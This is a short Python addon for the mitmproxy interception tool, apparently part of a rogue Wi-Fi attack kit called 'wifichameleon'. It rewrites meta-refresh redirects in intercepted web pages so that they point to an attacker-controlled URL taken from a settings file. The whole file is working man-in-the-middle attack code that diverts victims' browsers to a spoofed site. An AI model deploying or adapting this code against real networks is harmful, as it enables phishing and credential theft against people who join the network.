from wifichameleon.utils.util import read_settings

settings = read_settings()
real_url = settings['real_url']
attacker_url = settings['attacker_url']

class replaceMeta:
    def response(self, flow):
        if "Content-Type" in flow.response.headers and "text" in flow.response.headers["Content-Type"]:
            try:
                old_content = flow.response.content.decode().lower()
            except:
                print("[!] Decoding error")
                return
            begin_meta = old_content.find("<meta http-equiv=\"refresh\" content=")
            if begin_meta == -1:
                return
            url_begin = old_content.find("url=", begin_meta)
            if url_begin == -1:
                return
            end_meta = old_content.find(">", url_begin)
            new_content = old_content[:url_begin]
            new_content += old_content[url_begin:end_meta].replace(real_url, attacker_url)
            new_content += old_content[end_meta:]
            flow.response.content = new_content.encode()

addons = [
    replaceMeta()
]